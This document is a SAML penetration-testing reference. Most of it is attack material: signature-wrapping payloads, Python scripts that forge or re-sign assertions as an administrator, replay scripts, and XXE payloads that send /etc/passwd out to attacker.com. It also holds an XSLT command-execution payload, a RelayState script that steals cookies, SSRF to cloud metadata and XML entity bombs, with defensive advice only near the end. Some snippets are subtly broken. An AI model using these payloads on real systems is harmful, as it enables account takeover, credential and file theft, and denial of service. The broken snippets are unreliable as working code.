# SAML (Security Assertion Markup Language) Vulnerabilities

## Overview

SAML is an XML-based standard for exchanging authentication and authorization data between identity providers (IdPs) and service providers (SPs). This document covers comprehensive attack vectors against SAML implementations, including signature attacks, assertion manipulation, XML vulnerabilities, and protocol-level exploits.

---

## 1. Signature Attacks

### 1.1 XML Signature Wrapping (XSW) Attacks

**Vulnerability**: SAML processors may verify signatures on one element but act on a different, unsigned element with the same ID.

**Attack Principle**:
- SAML responses contain signed assertions
- XML allows multiple elements with same structure
- Attacker wraps malicious assertion while keeping valid signature on original

**XSW Attack Variants**:

**XSW1 - Signature Wrapping with Enveloped Transform**:
```xml
<samlp:Response>
  <!-- Original signed assertion (will be verified) -->
  <saml:Assertion ID="original">
    <saml:Subject>
      <saml:NameID>legitimate@user.com</saml:NameID>
    </saml:Subject>
    <ds:Signature>
      <ds:Reference URI="#original"/>
      <!-- Valid signature -->
    </ds:Signature>
  </saml:Assertion>

  <!-- Malicious assertion (will be processed) -->
  <saml:Assertion ID="malicious">
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**XSW2 - Detached Signature**:
```xml
<samlp:Response>
  <ds:Signature>
    <ds:Reference URI="#original"/>
  </ds:Signature>

  <!-- Malicious assertion first -->
  <saml:Assertion ID="malicious">
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>

  <!-- Original signed assertion -->
  <saml:Assertion ID="original">
    <saml:Subject>
      <saml:NameID>legitimate@user.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**XSW3 - Ancestor Wrapping**:
```xml
<samlp:Response>
  <evil:Wrapper>
    <saml:Assertion ID="original">
      <!-- Original signed content -->
      <ds:Signature>
        <ds:Reference URI="#original"/>
      </ds:Signature>
    </saml:Assertion>
  </evil:Wrapper>

  <!-- Malicious assertion at expected location -->
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**XSW4-8 Variants**: Additional wrapping techniques involving:
- Sibling injection
- Descendant wrapping
- Extensions element abuse
- Signature element relocation

**SAML Raider (Burp Extension)**:
```
1. Install SAML Raider from BApp Store
2. Capture SAML request/response in Proxy
3. Right-click -> Send to SAML Raider
4. Use "XSW Attacks" panel
5. Select XSW variant (1-8)
6. Click "Apply XSW"
7. Forward modified response
```

**Manual XSW Testing**:
```python
import xml.etree.ElementTree as ET

def apply_xsw1(saml_response):
    """Apply XSW1 attack pattern"""
    tree = ET.fromstring(saml_response)

    # Find original assertion
    ns = {
        'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
        'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol'
    }

    original_assertion = tree.find('.//saml:Assertion', ns)

    # Clone and modify
    malicious = ET.fromstring(ET.tostring(original_assertion))

    # Modify NameID to attacker
    nameid = malicious.find('.//saml:NameID', ns)
    nameid.text = 'admin@target.com'

    # Remove signature from malicious copy
    sig = malicious.find('.//{http://www.w3.org/2000/09/xmldsig#}Signature')
    if sig is not None:
        malicious.remove(sig)

    # Insert malicious assertion before original
    tree.insert(0, malicious)

    return ET.tostring(tree, encoding='unicode')
```

### 1.2 Missing Signature Validation

**Vulnerability**: SP accepts unsigned SAML responses/assertions.

**Testing**:
```bash
# Remove Signature element entirely
# Using SAML Raider: "Remove Signatures" option

# Manual: Delete <ds:Signature>...</ds:Signature> block
```

**Detection Script**:
```python
def test_unsigned_response(saml_response):
    """Remove signature and test if accepted"""
    import re

    # Remove signature block
    unsigned = re.sub(
        r'<ds:Signature[^>]*>.*?</ds:Signature>',
        '',
        saml_response,
        flags=re.DOTALL
    )

    # Base64 encode and test
    import base64
    encoded = base64.b64encode(unsigned.encode()).decode()

    # Submit to SP
    return encoded
```

### 1.3 Signature Exclusion

**Vulnerability**: Signature covers only part of the assertion.

**Attack**:
```xml
<saml:Assertion>
  <saml:Subject>
    <saml:NameID>user@domain.com</saml:NameID>
  </saml:Subject>

  <!-- Signature only covers Subject -->
  <ds:Signature>
    <ds:SignedInfo>
      <ds:Reference URI="#subject-element"/>
    </ds:SignedInfo>
  </ds:Signature>

  <!-- These attributes NOT signed - can be modified -->
  <saml:AttributeStatement>
    <saml:Attribute Name="role">
      <saml:AttributeValue>admin</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>
```

**Testing with SAML Raider**:
```
1. Open SAML response in SAML Raider
2. Check "Signature Coverage"
3. Identify unsigned elements
4. Modify unsigned elements
5. Test if changes are accepted
```

### 1.4 Certificate Spoofing/Self-Signed Certificates

**Vulnerability**: SP accepts any certificate for signature validation.

**Attack**:
```bash
# Generate self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout attacker-key.pem \
  -out attacker-cert.pem -days 365 -nodes \
  -subj "/CN=attacker-idp.com"

# Sign SAML response with attacker's certificate
```

**SAML Raider Certificate Attack**:
```
1. SAML Raider -> Certificates tab
2. "Import" or "Generate" new certificate
3. Use "Re-sign" with attacker certificate
4. Test if SP accepts
```

**Python Signing with Custom Certificate**:
```python
from signxml import XMLSigner
from lxml import etree

def sign_with_custom_cert(saml_response, private_key, certificate):
    """Sign SAML response with attacker's certificate"""
    root = etree.fromstring(saml_response.encode())

    # Remove existing signature
    for sig in root.findall('.//{http://www.w3.org/2000/09/xmldsig#}Signature'):
        sig.getparent().remove(sig)

    # Sign with attacker's key
    signer = XMLSigner(
        method=signxml.methods.enveloped,
        signature_algorithm="rsa-sha256",
        digest_algorithm="sha256"
    )

    signed = signer.sign(
        root,
        key=private_key,
        cert=certificate
    )

    return etree.tostring(signed, encoding='unicode')
```

---

## 2. Assertion Attacks

### 2.1 Assertion Replay

**Vulnerability**: Valid assertions accepted multiple times.

**Attack Flow**:
1. Capture valid SAML response
2. Wait for original session to expire
3. Replay captured response
4. Obtain new valid session

**Testing**:
```bash
# Capture SAML response
SAML_RESPONSE="PHNhbWxwOlJlc3BvbnNlLi4u"  # Base64 encoded

# Wait and replay
sleep 3600  # Wait 1 hour

curl -X POST https://sp.target.com/saml/acs \
  -d "SAMLResponse=$SAML_RESPONSE" \
  -d "RelayState=$RELAY_STATE"

# Check if accepted
```

**Automated Replay Testing**:
```python
import requests
import time

def test_replay(sp_acs_url, saml_response, relay_state, intervals):
    """Test assertion replay at various intervals"""
    results = []

    for interval in intervals:
        time.sleep(interval)
        response = requests.post(
            sp_acs_url,
            data={
                'SAMLResponse': saml_response,
                'RelayState': relay_state
            },
            allow_redirects=False
        )
        results.append({
            'interval_seconds': interval,
            'status': response.status_code,
            'accepted': response.status_code in [200, 302]
        })

    return results

# Test intervals: immediate, 5min, 1hour, 1day
results = test_replay(
    'https://sp.target.com/saml/acs',
    captured_saml_response,
    relay_state,
    [0, 300, 3600, 86400]
)
```

### 2.2 Assertion Manipulation

**Vulnerability**: Unsigned or improperly validated assertion attributes.

**Common Manipulation Targets**:
```xml
<!-- NameID - User identity -->
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
  admin@target.com  <!-- Change to privileged user -->
</saml:NameID>

<!-- Subject confirmation -->
<saml:SubjectConfirmationData
  NotOnOrAfter="2099-12-31T23:59:59Z"  <!-- Extend validity -->
  Recipient="https://sp.target.com/saml/acs"
  InResponseTo="_request_id"/>

<!-- Attributes -->
<saml:AttributeStatement>
  <saml:Attribute Name="role">
    <saml:AttributeValue>admin</saml:AttributeValue>  <!-- Escalate -->
  </saml:Attribute>
  <saml:Attribute Name="groups">
    <saml:AttributeValue>Administrators</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

### 2.3 Recipient/Audience Manipulation

**Vulnerability**: SP doesn't validate Recipient or Audience restrictions.

**Attack**:
```xml
<!-- Change Recipient -->
<saml:SubjectConfirmationData
  Recipient="https://attacker.com/saml/acs"/>  <!-- Redirect to attacker -->

<!-- Change Audience -->
<saml:AudienceRestriction>
  <saml:Audience>https://different-sp.com</saml:Audience>  <!-- Cross-SP -->
</saml:AudienceRestriction>
```

**Testing**:
```bash
# Modify Audience and test acceptance
# Use SAML Raider to edit Audience element
# Test if assertion for SP-A works on SP-B
```

### 2.4 Time Validation Bypass

**Vulnerability**: NotBefore/NotOnOrAfter conditions not properly validated.

**Attack**:
```xml
<!-- Extend validity period -->
<saml:Conditions
  NotBefore="2000-01-01T00:00:00Z"
  NotOnOrAfter="2099-12-31T23:59:59Z">
</saml:Conditions>

<!-- Remove time conditions -->
<saml:Conditions>
  <!-- No NotBefore/NotOnOrAfter -->
</saml:Conditions>
```

**SAML Raider Time Manipulation**:
```
1. Open SAML response in SAML Raider
2. Navigate to Conditions element
3. Modify NotBefore (set to past)
4. Modify NotOnOrAfter (set to far future)
5. Re-sign if needed
6. Test if accepted
```

---

## 3. XML Attacks

### 3.1 XML External Entity (XXE) Injection

**Vulnerability**: SAML processor parses external entities.

**Attack Payloads**:

**File Reading**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**SSRF**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.server/admin">
]>
<samlp:Response>
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:Response>
```

**Blind XXE with OOB**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<samlp:Response>
  <saml:Issuer>test</saml:Issuer>
</samlp:Response>

<!-- xxe.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Parameter Entity XXE**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<samlp:Response>
  <saml:Issuer>&all;</saml:Issuer>
</samlp:Response>
```

### 3.2 XSLT Injection

**Vulnerability**: SAML processor executes XSLT transforms.

**Attack**:
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  <ds:SignedInfo>
    <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
      <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
          <xsl:variable name="cmd" select="document('http://attacker.com/rce')"/>
        </xsl:template>
      </xsl:stylesheet>
    </ds:Transform>
  </ds:SignedInfo>
</ds:Signature>
```

**Java RCE via XSLT**:
```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj,'whoami')"/>
  </xsl:template>
</xsl:stylesheet>
```

### 3.3 XPath Injection

**Vulnerability**: User input used in XPath queries.

**Attack**:
```
# Normal query
//saml:Attribute[@Name='role']/saml:AttributeValue

# Injection
' or '1'='1
' or true() or '
'] | //saml:* | //*[@test='

# Data extraction
'] | //*[contains(text(),'admin')] | //*[@x='
```

**SAML Context**:
```xml
<!-- If SP uses XPath to extract NameID -->
<saml:NameID>user' or '1'='1</saml:NameID>
```

### 3.4 Billion Laughs (XML Bomb)

**Vulnerability**: XML parser vulnerable to entity expansion DoS.

**Attack**:
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<samlp:Response>
  <saml:Issuer>&lol9;</saml:Issuer>
</samlp:Response>
```

**Quadratic Blowup**:
```xml
<?xml version="1.0"?>
<!DOCTYPE kaboom [
  <!ENTITY a "aaaaaaaaaaaaaaaaaa...">  <!-- Repeat 50000 times -->
]>
<samlp:Response>
  <data>&a;&a;&a;&a;&a;...</data>  <!-- Reference 50000 times -->
</samlp:Response>
```

---

## 4. Protocol Attacks

### 4.1 IdP/SP Confusion

**Vulnerability**: Assertion intended for one SP accepted by another.

**Attack Scenario**:
```
1. User authenticates at IdP for SP-A
2. IdP issues assertion with Audience=SP-A
3. Attacker intercepts assertion
4. Attacker presents assertion to SP-B
5. SP-B accepts (doesn't validate Audience)
```

**Testing**:
```bash
# Capture assertion from one SP
# Present to different SP
curl -X POST https://different-sp.target.com/saml/acs \
  -d "SAMLResponse=$CAPTURED_RESPONSE"
```

### 4.2 RelayState Manipulation

**Vulnerability**: RelayState parameter not validated.

**Attack Vectors**:

**Open Redirect**:
```bash
# Normal RelayState (application deep link)
RelayState=https://app.target.com/dashboard

# Malicious RelayState
RelayState=https://attacker.com/phishing
RelayState=//attacker.com
RelayState=javascript:alert(1)
```

**XSS via RelayState**:
```bash
RelayState="><script>document.location='https://attacker.com/?c='+document.cookie</script>
RelayState=data:text/html,<script>alert(1)</script>
```

**SSRF via RelayState**:
```bash
RelayState=http://internal.server/admin
RelayState=http://169.254.169.254/latest/meta-data/
```

### 4.3 Assertion Consumer Service (ACS) Bypass

**Vulnerability**: SP accepts assertions at unintended endpoints.

**Testing**:
```bash
# Normal ACS
POST /saml/acs

# Test alternative endpoints
POST /saml/consume
POST /saml/callback
POST /auth/saml/acs
POST /sso/saml
POST /login/saml

# Test with modified AssertionConsumerServiceURL
```

### 4.4 SP-Initiated vs IdP-Initiated Confusion

**Vulnerability**: SP-initiated response accepted as IdP-initiated (or vice versa).

**Attack**:
```xml
<!-- SP-initiated has InResponseTo attribute -->
<samlp:Response InResponseTo="_request_id_123">

<!-- IdP-initiated has no InResponseTo -->
<samlp:Response>

<!-- Test: Remove InResponseTo from SP-initiated flow -->
<!-- Test: Add arbitrary InResponseTo to IdP-initiated flow -->
```

---

## 5. Tool Reference

### 5.1 SAML Raider (Burp Extension)

**Installation**:
```
1. Burp Suite -> Extender -> BApp Store
2. Search "SAML Raider"
3. Install
```

**Features**:
- SAML message decoder/encoder
- Certificate management
- XSW attack automation (8 variants)
- Signature manipulation
- Time condition modification

**Usage**:
```
1. Enable SAML Raider in Proxy
2. Capture SAML request/response
3. Right-click -> "Send to SAML Raider"
4. Edit in SAML Raider tab:
   - View decoded SAML
   - Apply XSW attacks
   - Manipulate attributes
   - Re-sign with custom certificate
5. Forward modified message
```

**XSW Attack Workflow**:
```
1. Capture SAML response
2. SAML Raider -> Analysis tab
3. Select "XSW Attacks"
4. Choose variant (XSW1-8)
5. Modify attacker NameID/attributes
6. Apply attack
7. Forward and verify
```

### 5.2 SAMLTool

**Commands**:
```bash
# Decode SAML response
samltool decode -i base64_response.txt

# Validate signature
samltool validate -i response.xml -c idp_cert.pem

# Generate SAML request
samltool request -i https://idp.com/saml \
  -a https://sp.com/saml/acs \
  -e https://sp.com

# Modify assertion
samltool modify -i response.xml \
  --nameid admin@target.com \
  --attribute role=admin
```

### 5.3 Python SAML Testing

```python
from lxml import etree
import base64
import zlib

def decode_saml_response(saml_b64):
    """Decode SAML response"""
    decoded = base64.b64decode(saml_b64)
    try:
        # Try deflate decompression
        xml = zlib.decompress(decoded, -15)
    except:
        xml = decoded
    return etree.fromstring(xml)

def encode_saml_response(xml_element):
    """Encode SAML response"""
    xml_string = etree.tostring(xml_element, encoding='unicode')
    return base64.b64encode(xml_string.encode()).decode()

def modify_nameid(saml_tree, new_nameid):
    """Modify NameID in SAML assertion"""
    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
    nameid = saml_tree.find('.//saml:NameID', ns)
    if nameid is not None:
        nameid.text = new_nameid
    return saml_tree

def add_attribute(saml_tree, name, value):
    """Add or modify attribute in assertion"""
    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}

    attr_statement = saml_tree.find('.//saml:AttributeStatement', ns)
    if attr_statement is not None:
        # Create new attribute
        attr = etree.SubElement(
            attr_statement,
            '{urn:oasis:names:tc:SAML:2.0:assertion}Attribute'
        )
        attr.set('Name', name)
        attr_value = etree.SubElement(
            attr,
            '{urn:oasis:names:tc:SAML:2.0:assertion}AttributeValue'
        )
        attr_value.text = value

    return saml_tree

def test_xxe(saml_b64):
    """Test for XXE vulnerability"""
    decoded = base64.b64decode(saml_b64).decode()

    # Inject XXE payload
    xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>'''

    modified = xxe_payload + decoded.split('?>', 1)[-1]
    return base64.b64encode(modified.encode()).decode()

# Example usage
saml_response = "PHNhbWxwOlJlc3BvbnNlLi4u"
tree = decode_saml_response(saml_response)

# Modify NameID
tree = modify_nameid(tree, "admin@target.com")

# Add admin attribute
tree = add_attribute(tree, "role", "administrator")

# Encode for submission
modified_response = encode_saml_response(tree)
print(modified_response)
```

### 5.4 OpenSSL for Certificate Operations

```bash
# Decode certificate from SAML response
echo "CERTIFICATE_BASE64" | base64 -d | openssl x509 -inform DER -text

# Generate self-signed certificate for testing
openssl req -x509 -newkey rsa:2048 -keyout test-key.pem \
  -out test-cert.pem -days 365 -nodes

# Sign XML (using xmlsec1)
xmlsec1 --sign --privkey-pem test-key.pem,test-cert.pem \
  --output signed.xml unsigned.xml

# Verify signature
xmlsec1 --verify --pubkey-cert-pem idp-cert.pem signed.xml
```

---

## 6. Defense Recommendations

### 6.1 Signature Validation

```python
# Always validate signatures
from signxml import XMLVerifier

def validate_saml_response(response_xml, trusted_cert):
    """Proper SAML signature validation"""
    try:
        verified_data = XMLVerifier().verify(
            response_xml,
            x509_cert=trusted_cert,
            validate_schema=True
        )
        return True, verified_data
    except Exception as e:
        return False, str(e)

# Ensure entire assertion is signed
# Validate certificate against trusted CA
# Check certificate revocation
```

### 6.2 XML Parsing Security

```python
from lxml import etree

# Secure parser configuration
parser = etree.XMLParser(
    resolve_entities=False,    # Disable entity resolution
    no_network=True,           # No network access
    dtd_validation=False,      # No DTD processing
    load_dtd=False,            # Don't load DTD
    huge_tree=False            # Limit tree size
)

# Use defusedxml for additional protection
import defusedxml.lxml as defused_lxml
tree = defused_lxml.parse(xml_file)
```

### 6.3 Assertion Validation

```python
def validate_assertion(assertion, expected_audience, expected_recipient):
    """Complete assertion validation"""

    # 1. Validate time conditions
    conditions = assertion.find('.//saml:Conditions', ns)
    not_before = datetime.fromisoformat(conditions.get('NotBefore'))
    not_after = datetime.fromisoformat(conditions.get('NotOnOrAfter'))
    now = datetime.utcnow()

    if not (not_before <= now <= not_after):
        raise ValueError("Assertion time validation failed")

    # 2. Validate audience
    audience = assertion.find('.//saml:Audience', ns).text
    if audience != expected_audience:
        raise ValueError("Invalid audience")

    # 3. Validate recipient
    recipient = assertion.find(
        './/saml:SubjectConfirmationData', ns
    ).get('Recipient')
    if recipient != expected_recipient:
        raise ValueError("Invalid recipient")

    # 4. Check InResponseTo (for SP-initiated)
    response_id = assertion.get('InResponseTo')
    if response_id and not validate_request_id(response_id):
        raise ValueError("Invalid InResponseTo")

    # 5. Check for replay
    assertion_id = assertion.get('ID')
    if is_assertion_replayed(assertion_id):
        raise ValueError("Assertion replay detected")

    return True
```

### 6.4 RelayState Protection

```python
import hmac
import hashlib

def secure_relay_state(url, secret_key):
    """Sign RelayState to prevent tampering"""
    signature = hmac.new(
        secret_key.encode(),
        url.encode(),
        hashlib.sha256
    ).hexdigest()
    return f"{url}|{signature}"

def validate_relay_state(relay_state, secret_key):
    """Validate RelayState signature"""
    url, signature = relay_state.rsplit('|', 1)
    expected = hmac.new(
        secret_key.encode(),
        url.encode(),
        hashlib.sha256
    ).hexdigest()
    return hmac.compare_digest(signature, expected)
```

---

## 7. Cheat Sheet

| Attack | Tool/Method | Key Indicator |
|--------|-------------|---------------|
| XSW1-8 | SAML Raider | Modified user accepted |
| Missing Signature | Remove `<ds:Signature>` | Unsigned accepted |
| XXE | Inject DOCTYPE | File read/SSRF |
| Assertion Replay | Replay old response | Session created |
| Time Bypass | Modify NotOnOrAfter | Expired assertion works |
| Audience Bypass | Change Audience element | Cross-SP accepted |
| Certificate Spoof | Re-sign with self-signed | Any cert accepted |
| RelayState Redirect | Modify RelayState URL | Redirects to attacker |

---

## 8. Attack Workflow

```
1. Reconnaissance
   - Identify SAML endpoints (/saml/acs, /saml/sso, /saml/metadata)
   - Download SP metadata
   - Identify IdP from metadata

2. Capture SAML Traffic
   - Enable Burp SAML Raider
   - Initiate authentication flow
   - Capture SAML request/response

3. Analysis
   - Decode SAML messages
   - Identify signed vs unsigned elements
   - Check certificate validation
   - Review time conditions

4. Attack Execution
   - XSW attacks (1-8 variants)
   - Signature removal
   - XXE injection
   - Assertion manipulation
   - Replay attacks

5. Verification
   - Check if modified assertion accepted
   - Verify privilege escalation
   - Document vulnerability
```

---

## References

- SAML 2.0 Core Specification
- OWASP SAML Security Cheat Sheet
- "On Breaking SAML" - Juraj Somorovsky et al.
- XML Signature Wrapping Attacks - Original Research
- SAML Raider Documentation
- PortSwigger SAML Vulnerabilities
- NIST SP 800-63C - Federation and Assertions
